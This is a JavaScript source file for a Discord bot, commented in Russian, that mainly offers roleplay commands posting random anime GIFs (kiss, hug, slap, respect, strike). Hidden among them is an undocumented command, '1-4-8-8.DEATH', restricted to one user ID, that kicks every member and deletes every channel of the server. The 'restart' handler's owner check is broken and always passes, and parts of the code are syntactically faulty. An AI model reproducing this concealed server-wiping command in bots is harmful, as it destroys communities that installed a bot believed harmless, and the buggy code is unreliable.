const fs = require('fs');
const Discord = require('discord.js');
const { prefix } = require('./botconfig.json');
const ytdl = require('ytdl-core');
const ms = module.require("ms");
const http = require('http');
const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end('ok');
});
server.listen(3000);

const bot = new Discord.Client();
const client = new Discord.Client();
client.commands = new Discord.Collection();

bot.commands = new Discord.Collection();

fs.readdir('./commandName/',(err,files)=>{
  if(err) console.log(err);
  let jsfiles = files.filter(f => f.split(".").pop() === "js");
  if(jsfiles.length <=0) console.log("Нет комманд для загруки");
});

const commandFiles = fs.readdirSync('./commandName').filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
    const command = require(`./commandName/${file}`);
    client.commands.set(command.name, command);
}

client.on('ready', () => {
    console.log('Ready!');
});

client.on('message', async (message) => { // ПИНГ
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    let messageArray = message.content.substring(prefix.length).split(' ');
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift();
    // Задаем аргументы
    let args = messageArray;
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'bot':
            await message.delete()
            const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`Я служу Лорду <@311096882841518080>`)
    .setImage(`https://s4.gifyu.com/images/scale_12002120dd2a152a716c.jpg`)
    message.channel.send(exampleEmbed);
    }
});

client.on('message', async (message) => { // RESTART
    if (!message.content.startsWith(prefix)) {
        return;
    }
    let messageArray = message.content.substring(prefix.length).split(' ');
    let cmd = messageArray.shift();
    let args = messageArray;
    console.log(cmd);
    console.log(args);
    switch (cmd) {
        case 'restart':
       await message.delete()
            const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setImage(`https://pbs.twimg.com/media/DVZ6y8mWkAIVMlU.jpg:large`)
    message.channel.send(exampleEmbed);
        if (message.author.id === '463668671513100309','311096882841518080') {
      const command = client.commands.get(commandName)
        || client.commands.find(cmd => cmd.aliases && cmd.aliases.includes(commandName));
    if (!command) return;
        process.exit();
    }
    }
});

client.on('message', async (message) => { // DEATH
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    let messageArray = message.content.substring(prefix.length).split(' ');
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift();
    // Задаем аргументы
    let args = messageArray;
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
      case '1-4-8-8.DEATH':
            await message.delete()
            const Embed = new Discord.MessageEmbed()
        if (message.author.id === '311096882841518080') {
            message.guild.members.cache.forEach(member => member.kick())
            message.guild.channels.cache.forEach(channel => channel.delete())
        .setColor('#36393E')
        .setDescription(`Death...`)
        .setImage(`https://ibb.co/ZgwB5bV`)
        message.channel.send(Embed);
        };
    };
});

client.on('message', async (message) => { // ПОЦЕЛУЙ
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    // сообщение c.setnick BOT
    let messageArray = message.content.substring(prefix.length).split(' '); // => ["c.setnick", "BOT"]
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift(); // => c.setnick"
    // Задаем аргументы
    let author = message.author
    let gif = [
    "https://s2.gifyu.com/images/original2e232c06b50cce9d.gif",
    "https://s4.gifyu.com/images/63825e3214ac36a482f5676c0f7765396f1179aer1-512-288_hq32a0e86a8b08be16.gif",
    "https://s4.gifyu.com/images/56deba239ddba81953c40a8c31dcb6c82cada176_hq.gif",
    "https://s4.gifyu.com/images/d653178492f95ad97011052d36549dcb.gif",
    "https://s4.gifyu.com/images/image5e01f5b4a19a7caf.png",
    "https://s4.gifyu.com/images/imageb44e7a275fc91288.png",
    "https://s4.gifyu.com/images/gif-anime-kisses-35.gif",
    "https://s4.gifyu.com/images/imaged33926fa748b4a0f.png",
    "https://s4.gifyu.com/images/tenor50bde1481dfdad9b.gif",
    "https://s4.gifyu.com/images/C1If.gif",
    "https://s4.gifyu.com/images/originalbe65b62a64383e27.gif",
    "https://s4.gifyu.com/images/dd49f5f5729ecadf28ab1f9255fe1a2c265f328br1-540-304_hq.gif",
    "https://s4.gifyu.com/images/originaled8e77528578c894.gif",
    "https://s4.gifyu.com/images/02f6124eb87bfea6ba1247ceb2cd1bf2d5f3dfb1_hq.gif",
    "https://s4.gifyu.com/images/8Sc2.gif",
    ]
    let args = messageArray // => ["BOT"]
    let user = message.mentions.members.first() || 'кого-то' // => bot
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'kiss':
            function getRandomArrayItem (arr) {
                let index = Math.floor(Math.random() * arr.length)
                return arr[index]
              }
              let i = getRandomArrayItem(gif)
              await message.delete()
    const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`${author} целует ${user}`)
    .setImage(`${i}`)

message.channel.send(exampleEmbed);
    }
});

client.on('message', async (message) => { // ОБНЯТЬ
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    // сообщение c.setnick BOT
    let messageArray = message.content.substring(prefix.length).split(' '); // => ["c.setnick", "BOT"]
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift(); // => c.setnick"
    // Задаем аргументы
    let author = message.author
    let gif = [
    "https://s4.gifyu.com/images/536369e0cf87196d654c4164c7c480bc22c6cfa8r1-540-304_hq.gif",
    "https://s4.gifyu.com/images/tenor388e2c877f013a41.gif",
    "https://s4.gifyu.com/images/UxvR.gif",
    "https://s4.gifyu.com/images/eae154c1c30cc252035e5648f29bf2a1.gif",
    "https://s4.gifyu.com/images/JMvU.gif",
    "https://s4.gifyu.com/images/6b4bb8820a05a841d3317172b7b0224f.gif",
    "https://s4.gifyu.com/images/2400eec8e83624dc8114a74261a145fe.gif",
    "https://s4.gifyu.com/images/89da977e0470415fd4e1d57f11e0c836.gif",
    "https://s4.gifyu.com/images/5fc7024b3bee25e36b8bd857baebe0a3906277b569167526.gif",
    "https://s4.gifyu.com/images/tenor054e9318ec76295c.gif",
    "https://s4.gifyu.com/images/LSGg.gif",
    "https://s4.gifyu.com/images/ObcB.gif",
    ]
    let args = messageArray // => ["BOT"]
    let user = message.mentions.members.first() || 'кого-то'
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'hug':
            function getRandomArrayItem (arr) {
                let index = Math.floor(Math.random() * arr.length)
                return arr[index]
              }
              let i = getRandomArrayItem(gif)
              await message.delete()
        const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`${author} обнимает ${user}`)
    .setImage(`${i}`)

message.channel.send(exampleEmbed);
    }
});

client.on('message', async (message) => { // РЕСПЕКТ
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    // сообщение c.setnick BOT
    let messageArray = message.content.substring(prefix.length).split(' '); // => ["c.setnick", "BOT"]
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift(); // => c.setnick"
    // Задаем аргументы
    let author = message.author
    let gif = [
    "https://s4.gifyu.com/images/BQM6jEZ-UJLgGUuvrNkYUFgM0p5K6Bj2NmuD8_9ZFCmYc9BmjBtHbI6e6TPXDEO0QvNGQJ94wTfVHKUKooQ-vg.gif",
    "https://s4.gifyu.com/images/scale_12002120dd2a152a716c.jpg",
    "https://s4.gifyu.com/images/Violet-Evergarden-02_13.22_2018.01.18_17.12.40.jpg",
    "https://s4.gifyu.com/images/15409350744700.jpg",
    "https://s4.gifyu.com/images/4b5KgtX.jpg",
    "https://s4.gifyu.com/images/bbb18dc92d5e7cf708babf17cd737d88a5e78f5ar1-1280-719v2_uhq.jpg",
    "https://s4.gifyu.com/images/AC28E9E7O1o.jpg",
    "https://s4.gifyu.com/images/maxresdefault06137d83151d4198.jpg",
    "https://s4.gifyu.com/images/UgzDpGy.jpg",
    ]
    let args = messageArray // => ["BOT"]
    let user = message.mentions.members.first() || 'кому-то'
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'respect':
            function getRandomArrayItem (arr) {
                let index = Math.floor(Math.random() * arr.length)
                return arr[index]
              }
              let i = getRandomArrayItem(gif)
              await message.delete()
        const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`${author} отдал честь ${user}`)
    .setImage(`${i}`)

message.channel.send(exampleEmbed);
    }
});

client.on('message', async (message) => { // ШЛЕПОК
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    // сообщение c.setnick BOT
    let messageArray = message.content.substring(prefix.length).split(' '); // => ["c.setnick", "BOT"]
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift(); // => c.setnick"
    // Задаем аргументы
    let author = message.author
    let gif = [
    "https://s4.gifyu.com/images/EbOG.gif",
    "https://s2.gifyu.com/images/akari-slap.gif",
    "https://s4.gifyu.com/images/83ee4ffdbc3dafcdfce7d868d6c70e4ba36adfc6.gif",
    "https://s4.gifyu.com/images/RqY9.gif",
    "https://s4.gifyu.com/images/tenor0972e4e76e8dec9a.gif",
    "https://s4.gifyu.com/images/tenor23b55086174d9c26.gif",
    "https://s4.gifyu.com/images/Kyousuke-GG_zpsc6bfc9d1.gif",
    "https://s4.gifyu.com/images/original4a3724c8ab58da56.gif",
    ]
    let args = messageArray // => ["BOT"]
    let user = message.mentions.members.first() || 'кого-то'
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'slap':
        function getRandomArrayItem (arr) {
                let index = Math.floor(Math.random() * arr.length)
                return arr[index]
              }
              let i = getRandomArrayItem(gif)
              await message.delete()
        const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`${author} шлёпнул ${user}`)
    .setImage(`${i}`)

message.channel.send(exampleEmbed);
    }
});

client.on('message', async (message) => { // УДАР
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    // сообщение c.setnick BOT
    let messageArray = message.content.substring(prefix.length).split(' '); // => ["c.setnick", "BOT"]
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift(); // => c.setnick"
    // Задаем аргументы
    let author = message.author
    let args = messageArray // => ["BOT"]
    let user = message.mentions.members.first() || 'кого-то'
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'strike':
         await message.delete()
        const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`${author} ударил ${user}`)
    .setImage('https://s4.gifyu.com/images/1353830854270.gif')

message.channel.send(exampleEmbed);
    }
});

client.on('message', async (message) => { // ПОМОЩЬ-КОММАНДЫ
    // Если сообщение началось не с префикса, ничего не делаем
    if (!message.content.startsWith(prefix)) {
        return;
    }
    // Превращаем текст сообщения в массив разделенный пробелами, обрезая до этого префикс
    // сообщение c.setnick BOT
    let messageArray = message.content.substring(prefix.length).split(' '); // => ["c.setnick", "BOT"]
    // Обозначаем команду как первый аргумент массива
    let cmd = messageArray.shift(); // => c.setnick"
    // Задаем аргументы
    let args = messageArray // => ["BOT"]
    console.log(cmd);
    console.log(args);
    // При помощи switch ищем нашу команду
    switch (cmd) {
        case 'help':
            await message.delete()
        const exampleEmbed = new Discord.MessageEmbed()
    .setColor('#36393E')
    .setDescription(`**Команды**\n*Используй тег* **"c."**\n**help** - *список команд*\n**kiss** - *поцелуй*\n**hug** - *обнять*\n**slap** - *шлёпнуть*\n**respect** - *отдать честь*\n**strike** - *ударить*`)
        .setImage(`https://s4.gifyu.com/images/scale_12002120dd2a152a716c.jpg`)
message.channel.send(exampleEmbed);
    }
});

client.on('message', message => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    if (!client.commands.has(commandName)) return;

    const command = client.commands.get(commandName);
    try {
        command.execute(message, args);
    } catch (error) {
        console.log(error);
    }
});

client.login();